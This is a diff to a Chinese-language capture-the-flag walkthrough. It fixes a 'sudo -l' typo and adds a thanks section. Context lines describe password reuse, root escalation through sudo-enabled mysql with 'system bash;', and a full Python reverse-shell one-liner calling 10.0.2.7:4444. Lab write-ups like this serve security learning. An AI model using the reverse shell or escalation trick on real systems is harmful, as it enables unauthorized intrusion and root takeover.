@@ -408,7 +408,7 @@ web页面居然是默认页面,空空如也?没关系,那就进行目录爆破,�
 
 接下来,我们要进行密码重用的尝试,居然神奇的登陆了wpadmin用户!获得local-flag
 
-通过`sudo -`,我们发现可以sudo使用mysql,于是我们成功以root权限登陆了mysql命令行.
+通过`sudo -l`,我们发现可以sudo使用mysql,于是我们成功以root权限登陆了mysql命令行.
 
 通过指令`system bash;`,我们成功获得root权限的shell~
 
@@ -434,3 +434,6 @@ web页面居然是默认页面,空空如也?没关系,那就进行目录爆破,�
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
+### 致谢
+
+**\~Michael\~**
